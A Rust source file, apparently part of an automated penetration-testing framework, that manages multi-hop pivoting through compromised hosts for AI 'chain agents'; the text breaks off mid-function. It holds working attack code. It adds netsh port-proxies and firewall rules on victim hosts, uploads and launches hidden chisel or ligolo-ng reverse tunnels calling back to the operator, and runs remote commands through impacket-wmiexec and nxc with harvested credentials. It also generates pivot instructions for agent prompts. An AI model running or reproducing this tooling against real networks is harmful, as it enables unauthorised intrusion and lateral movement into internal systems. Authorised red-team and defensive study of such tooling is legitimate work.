//! Multi-hop pivot proxy — reaching internal subnets through compromised hosts.
//!
//! The single-hop transport (`transport.rs`) gets traffic from the operator to
//! the engagement's entry point. This module handles the NEXT hops: when a
//! chain agent discovers a host on 10.0.1.x but the operator can only reach
//! 10.0.0.x, the agent needs a tunnel through a compromised pivot host that
//! bridges the two subnets.
//!
//! ```text
//!   operator ──(VPN)──→ 10.0.0.5  ──(pivot tunnel)──→ 10.0.1.6 (DC01)
//!                       APP-DMZ01                      internal subnet
//! ```
//!
//! The pivot manager tracks which hosts have been compromised, which subnets
//! they can reach, and stands up tunnels on demand. Chain agents get the right
//! proxy env so their tools (impacket, nxc, nmap) route through the pivot.

use serde::{Deserialize, Serialize};
use std::collections::{HashMap, HashSet};
use std::net::Ipv4Addr;
use std::sync::Arc;
use std::time::Duration;
use tokio::sync::RwLock;

/// A tunnel method the manager can establish through a compromised host.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum TunnelMethod {
    /// `netsh interface portproxy` — native Windows, no upload needed.
    PortProxy,
    /// Chisel client on pivot, chisel server on operator.
    Chisel,
    /// SOCKS proxy over WinRM (evil-winrm / pywinrm port-forward).
    WinRmSocks,
    /// SSH dynamic forward (`-D`) when pivot has SSH.
    SshDynamic,
    /// Ligolo-ng agent on pivot, proxy on operator.
    Ligolo,
    /// socat / plink based local forward.
    Socat,
    /// proxychains through an already-established SOCKS.
    Proxychains,
}

impl TunnelMethod {
    pub fn label(&self) -> &'static str {
        match self {
            TunnelMethod::PortProxy => "netsh-portproxy",
            TunnelMethod::Chisel => "chisel",
            TunnelMethod::WinRmSocks => "winrm-socks",
            TunnelMethod::SshDynamic => "ssh-dynamic",
            TunnelMethod::Ligolo => "ligolo-ng",
            TunnelMethod::Socat => "socat",
            TunnelMethod::Proxychains => "proxychains",
        }
    }

    /// Preferred order: native first (no upload), then lightweight, then heavy.
    pub fn preference_order() -> Vec<TunnelMethod> {
        vec![
            TunnelMethod::PortProxy,
            TunnelMethod::WinRmSocks,
            TunnelMethod::SshDynamic,
            TunnelMethod::Chisel,
            TunnelMethod::Socat,
            TunnelMethod::Ligolo,
        ]
    }
}

/// A compromised host that can serve as a pivot point.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PivotHost {
    /// IP/hostname of the compromised host (must be reachable from operator).
    pub address: String,
    /// Subnets this host can reach (learned from ARP table, routes, or config).
    pub reachable_subnets: Vec<String>,
    /// How we can execute commands on this host.
    pub access: PivotAccess,
    /// OS type — determines available tunnel methods.
    pub os: PivotOs,
    /// Whether chisel/ligolo binary is already on the host.
    pub has_chisel: bool,
    pub has_ligolo: bool,
    pub has_ssh: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum PivotAccess {
    /// WinRM with credentials.
    WinRm { domain: String, user: String, password: String },
    /// SSH with credentials or key.
    Ssh { user: String, password: Option<String>, key: Option<String> },
    /// SMB/PsExec with credentials.
    PsExec { domain: String, user: String, password: String },
    /// Existing C2 session.
    C2Session { session_id: String },
    /// WMI with credentials.
    Wmi { domain: String, user: String, password: String },
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum PivotOs {
    Windows,
    Linux,
}

/// An active tunnel through a pivot host.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ActiveTunnel {
    pub id: String,
    pub pivot_host: String,
    pub method: TunnelMethod,
    /// Local SOCKS port (operator side) or 0 for port-proxy.
    pub local_port: u16,
    /// Target subnets routed through this tunnel.
    pub target_subnets: Vec<String>,
    /// Individual port forwards: (remote_host, remote_port, local_port).
    pub port_forwards: Vec<(String, u16, u16)>,
    /// Process ID of the local tunnel process (chisel server, ssh, etc).
    pub local_pid: Option<u32>,
    /// Status.
    pub alive: bool,
}

impl ActiveTunnel {
    /// SOCKS proxy URL for tools, or None if this is a port-proxy (direct connect).
    pub fn proxy_url(&self) -> Option<String> {
        if self.local_port > 0 {
            Some(format!("socks5://127.0.0.1:{}", self.local_port))
        } else {
            None
        }
    }

    /// Environment variables for child processes to route through this tunnel.
    pub fn env_vars(&self) -> Vec<(String, String)> {
        match self.proxy_url() {
            Some(p) => vec![("ALL_PROXY".into(), p)],
            None => Vec::new(),
        }
    }
}

/// Manages pivot tunnels for a multi-hop engagement.
#[derive(Clone)]
pub struct PivotManager {
    inner: Arc<RwLock<PivotState>>,
}

struct PivotState {
    /// Known compromised hosts that can pivot.
    pivots: Vec<PivotHost>,
    /// Active tunnels, keyed by tunnel id.
    tunnels: HashMap<String, ActiveTunnel>,
    /// Next SOCKS port to allocate (starts at 10800).
    next_port: u16,
    /// Directly reachable subnets (from operator box, through VPN).
    direct_subnets: Vec<String>,
    /// Port-proxy forward allocations: (target_ip, target_port) -> local_port.
    port_map: HashMap<(String, u16), u16>,
    /// Next port-proxy local port (starts at 14000).
    next_fwd_port: u16,
}

impl PivotManager {
    pub fn new() -> Self {
        PivotManager {
            inner: Arc::new(RwLock::new(PivotState {
                pivots: Vec::new(),
                tunnels: HashMap::new(),
                next_port: 10800,
                direct_subnets: Vec::new(),
                port_map: HashMap::new(),
                next_fwd_port: 14000,
            })),
        }
    }

    /// Register subnets the operator can reach directly (through VPN/transport).
    pub async fn set_direct_subnets(&self, subnets: Vec<String>) {
        self.inner.write().await.direct_subnets = subnets;
    }

    /// Register a compromised host as a potential pivot point.
    pub async fn register_pivot(&self, host: PivotHost) {
        let mut state = self.inner.write().await;
        // Replace if same address already registered (updated creds/info).
        state.pivots.retain(|p| p.address != host.address);
        state.pivots.push(host);
    }

    /// Check if a target IP is directly reachable or needs a pivot.
    pub async fn needs_pivot(&self, target_ip: &str) -> bool {
        if !is_private_ip(target_ip) {
            return false;
        }
        let state = self.inner.read().await;
        // If target is in a directly-reachable subnet, no pivot needed.
        for subnet in &state.direct_subnets {
            if ip_in_subnet(target_ip, subnet) {
                return false;
            }
        }
        true
    }

    /// Find the best pivot host that can reach the target subnet.
    pub async fn find_pivot_for(&self, target_ip: &str) -> Option<PivotHost> {
        let state = self.inner.read().await;
        for pivot in &state.pivots {
            for subnet in &pivot.reachable_subnets {
                if ip_in_subnet(target_ip, subnet) {
                    return Some(pivot.clone());
                }
            }
        }
        None
    }

    /// Get or create a tunnel to reach the target IP. Returns the tunnel and
    /// env vars to inject into tool execution.
    pub async fn ensure_tunnel(
        &self,
        target_ip: &str,
        target_port: u16,
        tx: &tokio::sync::mpsc::Sender<String>,
    ) -> Result<(ActiveTunnel, Vec<(String, String)>), String> {
        // Check if we already have a tunnel covering this target.
        {
            let state = self.inner.read().await;
            for tunnel in state.tunnels.values() {
                if tunnel.alive {
                    for subnet in &tunnel.target_subnets {
                        if ip_in_subnet(target_ip, subnet) {
                            return Ok((tunnel.clone(), tunnel.env_vars()));
                        }
                    }
                    for (host, port, local) in &tunnel.port_forwards {
                        if host == target_ip && *port == target_port {
                            let env = vec![
                                ("PIVOT_HOST".into(), format!("127.0.0.1")),
                                ("PIVOT_PORT".into(), local.to_string()),
                                ("PIVOT_ORIGINAL".into(), format!("{}:{}", target_ip, target_port)),
                            ];
                            return Ok((tunnel.clone(), env));
                        }
                    }
                }
            }
        }

        // Need a new tunnel. Find the pivot host.
        let pivot = self.find_pivot_for(target_ip).await
            .ok_or_else(|| format!("no compromised pivot host can reach {target_ip}"))?;

        let _ = tx.send(format!(
            "🔀 pivot: {} cannot be reached directly, setting up tunnel through {}",
            target_ip, pivot.address
        )).await;

        // Try tunnel methods in preference order.
        let methods = available_methods(&pivot);
        let mut last_err = String::new();
        for method in methods {
            let _ = tx.send(format!(
                "🔀 pivot: trying {} via {}",
                method.label(), pivot.address
            )).await;

            match self.establish_tunnel(&pivot, &method, target_ip, target_port, tx).await {
                Ok(tunnel) => {
                    let env = tunnel.env_vars();
                    let id = tunnel.id.clone();
                    self.inner.write().await.tunnels.insert(id, tunnel.clone());
                    let _ = tx.send(format!(
                        "🔀 pivot: {} tunnel established through {} (port {})",
                        method.label(), pivot.address, tunnel.local_port
                    )).await;
                    return Ok((tunnel, env));
                }
                Err(e) => {
                    let _ = tx.send(format!(
                        "🔀 pivot: {} failed on {}: {}",
                        method.label(), pivot.address, e
                    )).await;
                    last_err = e;
                }
            }
        }

        Err(format!("all tunnel methods failed for {} via {}: {}", target_ip, pivot.address, last_err))
    }

    /// Establish a specific tunnel type.
    async fn establish_tunnel(
        &self,
        pivot: &PivotHost,
        method: &TunnelMethod,
        target_ip: &str,
        target_port: u16,
        tx: &tokio::sync::mpsc::Sender<String>,
    ) -> Result<ActiveTunnel, String> {
        let target_subnet = ip_to_subnet(target_ip);
        let tunnel_id = format!("pivot-{}-{}", pivot.address.replace('.', "_"), now_ms());

        match method {
            TunnelMethod::PortProxy => {
                self.setup_portproxy(pivot, target_ip, target_port, &tunnel_id, &target_subnet).await
            }
            TunnelMethod::WinRmSocks => {
                self.setup_winrm_socks(pivot, &tunnel_id, &target_subnet, tx).await
            }
            TunnelMethod::SshDynamic => {
                self.setup_ssh_dynamic(pivot, &tunnel_id, &target_subnet).await
            }
            TunnelMethod::Chisel => {
                self.setup_chisel(pivot, &tunnel_id, &target_subnet, tx).await
            }
            TunnelMethod::Socat => {
                self.setup_socat(pivot, target_ip, target_port, &tunnel_id, &target_subnet).await
            }
            TunnelMethod::Ligolo => {
                self.setup_ligolo(pivot, &tunnel_id, &target_subnet, tx).await
            }
            TunnelMethod::Proxychains => Err("proxychains requires another method first".into()),
        }
    }

    /// netsh interface portproxy — Windows native, no upload.
    async fn setup_portproxy(
        &self,
        pivot: &PivotHost,
        target_ip: &str,
        target_port: u16,
        tunnel_id: &str,
        target_subnet: &str,
    ) -> Result<ActiveTunnel, String> {
        if pivot.os != PivotOs::Windows {
            return Err("portproxy only on Windows".into());
        }
        let (domain, user, pass) = match &pivot.access {
            PivotAccess::WinRm { domain, user, password } => (domain.clone(), user.clone(), password.clone()),
            PivotAccess::PsExec { domain, user, password } => (domain.clone(), user.clone(), password.clone()),
            PivotAccess::Wmi { domain, user, password } => (domain.clone(), user.clone(), password.clone()),
            _ => return Err("portproxy needs WinRM/PsExec/WMI credentials".into()),
        };

        // Allocate a local port.
        let local_port = {
            let mut state = self.inner.write().await;
            let key = (target_ip.to_string(), target_port);
            if let Some(&port) = state.port_map.get(&key) {
                port
            } else {
                let port = state.next_fwd_port;
                state.next_fwd_port += 1;
                state.port_map.insert(key, port);
                port
            }
        };

        // Set up portproxy on the pivot host via WinRM.
        let cmd = format!(
            "netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport={local_port} connectaddress={target_ip} connectport={target_port}"
        );
        exec_on_pivot(&pivot.address, &domain, &user, &pass, &cmd).await?;

        // Also open the firewall for that port.
        let fw_cmd = format!(
            "netsh advfirewall firewall add rule name=\"pivot-{local_port}\" dir=in action=allow protocol=TCP localport={local_port}"
        );
        let _ = exec_on_pivot(&pivot.address, &domain, &user, &pass, &fw_cmd).await;

        Ok(ActiveTunnel {
            id: tunnel_id.to_string(),
            pivot_host: pivot.address.clone(),
            method: TunnelMethod::PortProxy,
            local_port: 0, // No SOCKS — connect to pivot_host:local_port directly.
            target_subnets: vec![target_subnet.to_string()],
            port_forwards: vec![(target_ip.to_string(), target_port, local_port)],
            local_pid: None,
            alive: true,
        })
    }

    /// SOCKS proxy over WinRM using SocksOverRDP-style tunnel or chisel-on-winrm.
    async fn setup_winrm_socks(
        &self,
        pivot: &PivotHost,
        tunnel_id: &str,
        target_subnet: &str,
        tx: &tokio::sync::mpsc::Sender<String>,
    ) -> Result<ActiveTunnel, String> {
        if pivot.os != PivotOs::Windows {
            return Err("WinRM SOCKS only on Windows pivots".into());
        }
        let (domain, user, pass) = match &pivot.access {
            PivotAccess::WinRm { domain, user, password } => (domain.clone(), user.clone(), password.clone()),
            _ => return Err("WinRM SOCKS needs WinRM credentials".into()),
        };

        let socks_port = {
            let mut state = self.inner.write().await;
            let port = state.next_port;
            state.next_port += 1;
            port
        };

        // Use chisel if available. Need Windows binary for upload, local for server.
        let chisel_win = find_chisel_windows().or_else(find_chisel_binary);
        if chisel_win.is_some() && find_chisel_binary().is_some() {
            let upload_bin = chisel_win.unwrap();
            // Start chisel server locally.
            let server_pid = start_chisel_server(socks_port).await?;

            // Upload chisel to pivot via SMB or WinRM.
            let _ = tx.send(format!("🔀 pivot: uploading chisel to {}", pivot.address)).await;
            upload_via_winrm(&pivot.address, &domain, &user, &pass, &upload_bin, "C:\\Windows\\Temp\\chisel.exe").await?;

            // Start chisel client on pivot (reverse SOCKS).
            let our_ip = get_our_ip_for(&pivot.address).await?;
            let client_cmd = format!(
                "Start-Process -WindowStyle Hidden -FilePath C:\\Windows\\Temp\\chisel.exe -ArgumentList 'client {our_ip}:{socks_port} R:socks'"
            );
            exec_on_pivot_ps(&pivot.address, &domain, &user, &pass, &client_cmd).await?;

            // Wait for tunnel to come up.
            tokio::time::sleep(Duration::from_secs(3)).await;

            Ok(ActiveTunnel {
                id: tunnel_id.to_string(),
                pivot_host: pivot.address.clone(),
                method: TunnelMethod::WinRmSocks,
                local_port: socks_port,
                target_subnets: vec![target_subnet.to_string()],
                port_forwards: Vec::new(),
                local_pid: Some(server_pid),
                alive: true,
            })
        } else {
            Err("chisel binary not found — cannot establish WinRM SOCKS".into())
        }
    }

    /// SSH dynamic forward (-D) for Linux pivots.
    async fn setup_ssh_dynamic(
        &self,
        pivot: &PivotHost,
        tunnel_id: &str,
        target_subnet: &str,
    ) -> Result<ActiveTunnel, String> {
        let (user, password, key) = match &pivot.access {
            PivotAccess::Ssh { user, password, key } => (user.clone(), password.clone(), key.clone()),
            _ => return Err("SSH dynamic needs SSH credentials".into()),
        };

        let socks_port = {
            let mut state = self.inner.write().await;
            let port = state.next_port;
            state.next_port += 1;
            port
        };

        let mut args = vec![
            "-N".to_string(),
            "-D".to_string(), socks_port.to_string(),
            "-o".to_string(), "StrictHostKeyChecking=no".to_string(),
            "-o".to_string(), "UserKnownHostsFile=/dev/null".to_string(),
            "-o".to_string(), "ServerAliveInterval=15".to_string(),
        ];
        if let Some(k) = &key {
            args.push("-i".into());
            args.push(k.clone());
        }
        args.push(format!("{}@{}", user, pivot.address));

        let child = if password.is_some() {
            // Use sshpass for password auth.
            let mut sshpass_args = vec![
                "-p".to_string(),
                password.unwrap(),
                "ssh".to_string(),
            ];
            sshpass_args.extend(args);
            spawn_tunnel("sshpass", &sshpass_args)?
        } else {
            spawn_tunnel("ssh", &args)?
        };

        tokio::time::sleep(Duration::from_secs(2)).await;

        Ok(ActiveTunnel {
            id: tunnel_id.to_string(),
            pivot_host: pivot.address.clone(),
            method: TunnelMethod::SshDynamic,
            local_port: socks_port,
            target_subnets: vec![target_subnet.to_string()],
            port_forwards: Vec::new(),
            local_pid: Some(child),
            alive: true,
        })
    }

    /// Chisel reverse SOCKS — works for both Windows and Linux pivots.
    async fn setup_chisel(
        &self,
        pivot: &PivotHost,
        tunnel_id: &str,
        target_subnet: &str,
        tx: &tokio::sync::mpsc::Sender<String>,
    ) -> Result<ActiveTunnel, String> {
        let chisel_bin = find_chisel_binary()
            .ok_or("chisel binary not found on operator box")?;

        let socks_port = {
            let mut state = self.inner.write().await;
            let port = state.next_port;
            state.next_port += 1;
            port
        };

        // Start chisel server locally in reverse mode.
        let server_pid = start_chisel_server(socks_port).await?;
        let our_ip = get_our_ip_for(&pivot.address).await?;

        // Upload and start chisel client on pivot.
        let _ = tx.send(format!("🔀 pivot: deploying chisel on {}", pivot.address)).await;
        match &pivot.access {
            PivotAccess::WinRm { domain, user, password } => {
                upload_via_winrm(&pivot.address, domain, user, password, &chisel_bin, "C:\\Windows\\Temp\\chisel.exe").await?;
                let cmd = format!(
                    "Start-Process -WindowStyle Hidden -FilePath C:\\Windows\\Temp\\chisel.exe -ArgumentList 'client {our_ip}:{socks_port} R:socks'"
                );
                exec_on_pivot_ps(&pivot.address, domain, user, password, &cmd).await?;
            }
            PivotAccess::Ssh { user, password, key } => {
                upload_via_scp(&pivot.address, user, password.as_deref(), key.as_deref(), &chisel_bin, "/tmp/chisel").await?;
                let cmd = format!("chmod +x /tmp/chisel && nohup /tmp/chisel client {our_ip}:{socks_port} R:socks &");
                exec_on_ssh(&pivot.address, user, password.as_deref(), key.as_deref(), &cmd).await?;
            }
            PivotAccess::PsExec { domain, user, password } => {
                let cmd = format!(
                    "C:\\Windows\\Temp\\chisel.exe client {our_ip}:{socks_port} R:socks"
                );
                exec_on_pivot(&pivot.address, domain, user, password, &cmd).await?;
            }
            _ => return Err("chisel deployment needs WinRM, SSH or PsExec access".into()),
        }

        tokio::time::sleep(Duration::from_secs(3)).await;

        Ok(ActiveTunnel {
            id: tunnel_id.to_string(),
            pivot_host: pivot.address.clone(),
            method: TunnelMethod::Chisel,
            local_port: socks_port,
            target_subnets: vec![target_subnet.to_string()],
            port_forwards: Vec::new(),
            local_pid: Some(server_pid),
            alive: true,
        })
    }

    /// socat local forward — simple port-to-port relay.
    async fn setup_socat(
        &self,
        pivot: &PivotHost,
        target_ip: &str,
        target_port: u16,
        tunnel_id: &str,
        target_subnet: &str,
    ) -> Result<ActiveTunnel, String> {
        let (domain, user, pass) = extract_creds(&pivot.access)?;

        let local_port = {
            let mut state = self.inner.write().await;
            let key = (target_ip.to_string(), target_port);
            if let Some(&port) = state.port_map.get(&key) {
                port
            } else {
                let port = state.next_fwd_port;
                state.next_fwd_port += 1;
                state.port_map.insert(key, port);
                port
            }
        };

        let cmd = if pivot.os == PivotOs::Windows {
            format!(
                "netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport={local_port} connectaddress={target_ip} connectport={target_port}"
            )
        } else {
            format!(
                "nohup socat TCP-LISTEN:{local_port},fork,reuseaddr TCP:{target_ip}:{target_port} &"
            )
        };
        exec_on_pivot(&pivot.address, &domain, &user, &pass, &cmd).await?;

        Ok(ActiveTunnel {
            id: tunnel_id.to_string(),
            pivot_host: pivot.address.clone(),
            method: TunnelMethod::Socat,
            local_port: 0,
            target_subnets: vec![target_subnet.to_string()],
            port_forwards: vec![(target_ip.to_string(), target_port, local_port)],
            local_pid: None,
            alive: true,
        })
    }

    /// Ligolo-ng reverse tunnel — full subnet routing.
    async fn setup_ligolo(
        &self,
        pivot: &PivotHost,
        tunnel_id: &str,
        target_subnet: &str,
        tx: &tokio::sync::mpsc::Sender<String>,
    ) -> Result<ActiveTunnel, String> {
        // Ligolo requires the proxy binary locally and the agent on the pivot.
        let ligolo_proxy = which_path("ligolo-proxy")
            .or_else(|| which_path("proxy"))
            .ok_or("ligolo-ng proxy not found on operator box")?;
        let ligolo_agent = which_path("ligolo-agent")
            .or_else(|| which_path("agent"))
            .ok_or("ligolo-ng agent not found on operator box")?;

        let listen_port = {
            let mut state = self.inner.write().await;
            let port = state.next_port;
            state.next_port += 1;
            port
        };

        // Start ligolo proxy locally.
        let proxy_pid = spawn_tunnel(
            &ligolo_proxy,
            &["-selfcert".to_string(), "-laddr".to_string(), format!("0.0.0.0:{listen_port}")],
        )?;

        let our_ip = get_our_ip_for(&pivot.address).await?;

        // Deploy agent to pivot.
        let _ = tx.send(format!("🔀 pivot: deploying ligolo agent on {}", pivot.address)).await;
        match &pivot.access {
            PivotAccess::WinRm { domain, user, password } => {
                upload_via_winrm(&pivot.address, domain, user, password, &ligolo_agent, "C:\\Windows\\Temp\\agent.exe").await?;
                let cmd = format!(
                    "Start-Process -WindowStyle Hidden -FilePath C:\\Windows\\Temp\\agent.exe -ArgumentList '-connect {our_ip}:{listen_port} -ignore-cert'"
                );
                exec_on_pivot_ps(&pivot.address, domain, user, password, &cmd).await?;
            }
            PivotAccess::Ssh { user, password, key } => {
                upload_via_scp(&pivot.address, user, password.as_deref(), key.as_deref(), &ligolo_agent, "/tmp/agent").await?;
                let cmd = format!("chmod +x /tmp/agent && nohup /tmp/agent -connect {our_ip}:{listen_port} -ignore-cert &");
                exec_on_ssh(&pivot.address, user, password.as_deref(), key.as_deref(), &cmd).await?;
            }
            _ => return Err("ligolo deployment needs WinRM or SSH access".into()),
        }

        tokio::time::sleep(Duration::from_secs(3)).await;

        // Add route for target subnet through ligolo tun interface.
        // This requires the ligolo proxy to be in "autoroute" mode or manual tuntap setup.
        // For now, we add the route via ip/route command.
        let _ = std::process::Command::new("sudo")
            .args(["ip", "route", "add", target_subnet, "dev", "ligolo"])
            .status();

        Ok(ActiveTunnel {
            id: tunnel_id.to_string(),
            pivot_host: pivot.address.clone(),
            method: TunnelMethod::Ligolo,
            local_port: 0, // Ligolo uses tun interface, not SOCKS.
            target_subnets: vec![target_subnet.to_string()],
            port_forwards: Vec::new(),
            local_pid: Some(proxy_pid),
            alive: true,
        })
    }

    /// Tear down all active tunnels.
    pub async fn disconnect_all(&self) {
        let mut state = self.inner.write().await;
        // Collect cleanup info before mutating.
        let cleanup: Vec<_> = state.tunnels.values().map(|t| {
            (t.local_pid, t.method.clone(), t.pivot_host.clone(), t.port_forwards.clone())
        }).collect();
        let pivots = state.pivots.clone();
        for (pid, method, pivot_host, forwards) in &cleanup {
            if let Some(pid) = pid {
                let _ = std::process::Command::new("kill").arg(pid.to_string()).status();
            }
            if *method == TunnelMethod::PortProxy || *method == TunnelMethod::Socat {
                for (_host, _port, local_port) in forwards {
                    if let Some(pivot) = pivots.iter().find(|p| p.address == *pivot_host) {
                        if let Ok((domain, user, pass)) = extract_creds(&pivot.access) {
                            let cmd = format!(
                                "netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport={local_port}"
                            );
                            let ph = pivot_host.clone();
                            let _ = tokio::task::block_in_place(|| {
                                std::thread::spawn(move || {
                                    let rt = tokio::runtime::Runtime::new().unwrap();
                                    rt.block_on(exec_on_pivot(&ph, &domain, &user, &pass, &cmd))
                                }).join()
                            });
                        }
                    }
                }
            }
        }
        state.tunnels.clear();
    }

    /// Get active tunnels summary for logging.
    pub async fn summary(&self) -> String {
        let state = self.inner.read().await;
        if state.tunnels.is_empty() {
            return "no active pivot tunnels".to_string();
        }
        state.tunnels.values()
            .filter(|t| t.alive)
            .map(|t| format!("{} via {} ({})", t.target_subnets.join(","), t.pivot_host, t.method.label()))
            .collect::<Vec<_>>()
            .join("; ")
    }

    /// Generate a pivot instruction block for chain agent prompts.
    pub async fn agent_instructions(&self, target_ip: &str) -> String {
        let state = self.inner.read().await;
        let mut instructions = String::new();

        for tunnel in state.tunnels.values().filter(|t| t.alive) {
            for subnet in &tunnel.target_subnets {
                if ip_in_subnet(target_ip, subnet) {
                    match &tunnel.method {
                        TunnelMethod::PortProxy | TunnelMethod::Socat => {
                            for (host, port, local_port) in &tunnel.port_forwards {
                                if host == target_ip {
                                    instructions.push_str(&format!(
                                        "PIVOT: {target_ip}:{port} is reachable at {pivot_host}:{local_port} (portproxy through {pivot_host}). Use {pivot_host}:{local_port} in place of {target_ip}:{port} for all tools.\n",
                                        pivot_host = tunnel.pivot_host,
                                    ));
                                }
                            }
                        }
                        _ => {
                            if let Some(proxy) = tunnel.proxy_url() {
                                instructions.push_str(&format!(
                                    "PIVOT: {target_ip} is reachable through SOCKS proxy at {proxy} (tunnel via {pivot_host}). Set ALL_PROXY={proxy} or use proxychains/--proxy for all tools targeting {target_ip}.\n",
                                    pivot_host = tunnel.pivot_host,
                                ));
                            }
                        }
                    }
                }
            }
        }

        instructions
    }
}

// ---------------------------------------------------------------------------
// Helper functions
// ---------------------------------------------------------------------------

fn now_ms() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_millis() as u64
}

fn is_private_ip(ip: &str) -> bool {
    if let Ok(v4) = ip.parse::<Ipv4Addr>() {
        v4.is_private() || v4.is_loopback()
    } else {
        false
    }
}

/// Check if an IP falls within a CIDR subnet (e.g. "10.0.1.0/24").
pub fn ip_in_subnet(ip: &str, subnet: &str) -> bool {
    let (net_str, bits_str) = match subnet.split_once('/') {
        Some(pair) => pair,
        None => {
            // Treat "10.0.1" as "10.0.1.0/24" shorthand.
            let octets: Vec<&str> = subnet.split('.').collect();
            let expanded = match octets.len() {
                3 => format!("{}.0/24", subnet),
                2 => format!("{}.0.0/16", subnet),
                _ => return ip == subnet,
            };
            return ip_in_subnet(ip, &expanded);
        }
    };
    let bits: u32 = match bits_str.parse() {
        Ok(b) if b <= 32 => b,
        _ => return false,
    };
    let ip_addr: Ipv4Addr = match ip.parse() {
        Ok(a) => a,
        _ => return false,
    };
    let net_addr: Ipv4Addr = match net_str.parse() {
        Ok(a) => a,
        _ => return false,
    };
    let mask = if bits == 0 { 0u32 } else { !0u32 << (32 - bits) };
    (u32::from(ip_addr) & mask) == (u32::from(net_addr) & mask)
}

/// Extract /24 subnet from an IP.
fn ip_to_subnet(ip: &str) -> String {
    if let Ok(v4) = ip.parse::<Ipv4Addr>() {
        let o = v4.octets();
        format!("{}.{}.{}.0/24", o[0], o[1], o[2])
    } else {
        format!("{}/24", ip)
    }
}

/// Which tunnel methods are available for a given pivot host.
fn available_methods(pivot: &PivotHost) -> Vec<TunnelMethod> {
    let mut methods = Vec::new();
    match pivot.os {
        PivotOs::Windows => {
            match &pivot.access {
                PivotAccess::WinRm { .. } | PivotAccess::PsExec { .. } | PivotAccess::Wmi { .. } => {
                    methods.push(TunnelMethod::PortProxy);
                    methods.push(TunnelMethod::WinRmSocks);
                    if find_chisel_binary().is_some() {
                        methods.push(TunnelMethod::Chisel);
                    }
                }
                PivotAccess::Ssh { .. } => {
                    methods.push(TunnelMethod::SshDynamic);
                    if find_chisel_binary().is_some() {
                        methods.push(TunnelMethod::Chisel);
                    }
                }
                PivotAccess::C2Session { .. } => {
                    methods.push(TunnelMethod::PortProxy);
                }
            }
        }
        PivotOs::Linux => {
            match &pivot.access {
                PivotAccess::Ssh { .. } => {
                    methods.push(TunnelMethod::SshDynamic);
                    methods.push(TunnelMethod::Socat);
                    if find_chisel_binary().is_some() {
                        methods.push(TunnelMethod::Chisel);
                    }
                }
                _ => {
                    if find_chisel_binary().is_some() {
                        methods.push(TunnelMethod::Chisel);
                    }
                    methods.push(TunnelMethod::Socat);
                }
            }
        }
    }
    methods
}

fn extract_creds(access: &PivotAccess) -> Result<(String, String, String), String> {
    match access {
        PivotAccess::WinRm { domain, user, password } => Ok((domain.clone(), user.clone(), password.clone())),
        PivotAccess::PsExec { domain, user, password } => Ok((domain.clone(), user.clone(), password.clone())),
        PivotAccess::Wmi { domain, user, password } => Ok((domain.clone(), user.clone(), password.clone())),
        PivotAccess::Ssh { user, password, .. } => {
            Ok(("".into(), user.clone(), password.clone().unwrap_or_default()))
        }
        _ => Err("no extractable credentials".into()),
    }
}

/// Execute a command on a Windows pivot via WinRM (evil-winrm / impacket wmiexec).
async fn exec_on_pivot(host: &str, domain: &str, user: &str, pass: &str, cmd: &str) -> Result<String, String> {
    // Try impacket-wmiexec first (more reliable), fall back to evil-winrm.
    let cred = if domain.is_empty() {
        format!("{}:{}@{}", user, pass, host)
    } else {
        format!("{}/{}:{}@{}", domain, user, pass, host)
    };

    let output = tokio::process::Command::new("impacket-wmiexec")
        .args([&cred, cmd, "-nooutput"])
        .output()
        .await
        .map_err(|e| format!("wmiexec failed: {e}"))?;

    if output.status.success() {
        Ok(String::from_utf8_lossy(&output.stdout).to_string())
    } else {
        // Fall back to nxc smb.
        let nxc = tokio::process::Command::new("nxc")
            .args(["smb", host, "-u", user, "-p", pass, "-d", domain, "-x", cmd])
            .output()
            .await
            .map_err(|e| format!("nxc exec failed: {e}"))?;
        if nxc.status.success() {
            Ok(String::from_utf8_lossy(&nxc.stdout).to_string())
        } else {
            Err(format!("remote exec failed on {}: {}", host, String::from_utf8_lossy(&nxc.stderr)))
        }
    }
}

/// Execute PowerShell on a Windows pivot via WinRM.
async fn exec_on_pivot_ps(host: &str, domain: &str, user: &str, pass: &str, cmd: &str) -> Result<String, String> {
    let ps_cmd = format!("powershell.exe -NonInteractive -Command \"{}\"", cmd.replace('"', "\\\""));
    exec_on_pivot(host, domain, user, pass, &ps_cmd).await
}

/// Execute a command on a Linux pivot via SSH.
async fn exec_on_ssh(host: &str, user: &str, password: Option<&str>, key: Option<&str>, cmd: &str) -> Result<String, String> {
    let mut args = vec![
        "-o".to_string(), "StrictHostKeyChecking=no".to_string(),
        "-o".to_string(), "UserKnownHostsFile=/dev/null".to_string(),
    ];
    if let Some(k) = key {
        args.push("-i".into());
        args.push(k.into());
    }
    args.push(format!("{}@{}", user, host));
    args.push(cmd.to_string());

    let output = if let Some(pass) = password {
        tokio::process::Command::new("sshpass")
            .args(["-p", pass, "ssh"])
            .args(&args)
            .output()
            .await
    } else {
        tokio::process::Command::new("ssh")
            .args(&args)
            .output()
            .await
    };

    match output {
        Ok(o) if o.status.success() => Ok(String::from_utf8_lossy(&o.stdout).to_string()),
        Ok(o) => Err(format!("SSH exec failed: {}", String::from_utf8_lossy(&o.stderr))),
        Err(e) => Err(format!("SSH spawn failed: {e}")),
    }
}

/// Upload a file to a Windows pivot via impacket-smbclient or WinRM.
async fn upload_via_winrm(host: &str, domain: &str, user: &str, pass: &str, local_path: &str, remote_path: &str) -> Result<(), String> {
    let cred = if domain.is_empty() {
        format!("{}:{}@{}", user, pass, host)
    } else {
        format!("{}/{}:{}@{}", domain, user, pass, host)
    };

    // Convert remote_path like C:\Windows\Temp\chisel.exe to SMB share path.
    let share_path = if remote_path.starts_with("C:\\") {
        format!("C$/{}", &remote_path[3..].replace('\\', "/"))
    } else {
        remote_path.replace('\\', "/")
    };

    let output = tokio::process::Command::new("impacket-smbclient")
        .args([&cred, "-c", &format!("put {} {}", local_path, share_path)])
        .output()
        .await
